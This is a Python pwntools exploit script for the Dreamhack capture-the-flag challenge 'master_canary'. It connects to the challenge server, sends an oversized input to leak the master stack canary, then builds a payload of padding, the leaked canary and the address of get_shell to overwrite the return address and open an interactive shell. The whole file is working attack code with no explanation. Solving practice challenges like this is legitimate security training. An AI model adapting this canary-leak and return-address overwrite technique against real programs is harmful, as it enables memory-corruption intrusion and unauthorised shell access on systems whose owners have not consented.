from pwn import *


def slog(name, addr):
    return success(": ".join([name, hex(addr)]))


p = remote("host3.dreamhack.games", 10847)
elf = ELF("./master_canary")
# p = process("./master_canary")

get_shell = elf.symbols["get_shell"]


# Master Canary Leak
payload = b"A" * 0x8E9

inp_sz = len(payload)

p.sendlineafter("> ", "1")
p.sendlineafter("> ", "2")

p.sendlineafter("Size: ", str(inp_sz))
p.sendlineafter("Data: ", payload)

p.recvuntil("A" * inp_sz)
canary = u64(p.recvn(7).rjust(8, b"\x00"))
slog("canary", canary)


# RET Overwrite
payload = b"A" * 40
payload += p64(canary)
payload += b"B" * 8
payload += p64(get_shell)

p.sendlineafter("> ", "3")
p.sendlineafter("Leave comment: ", payload)

p.interactive()
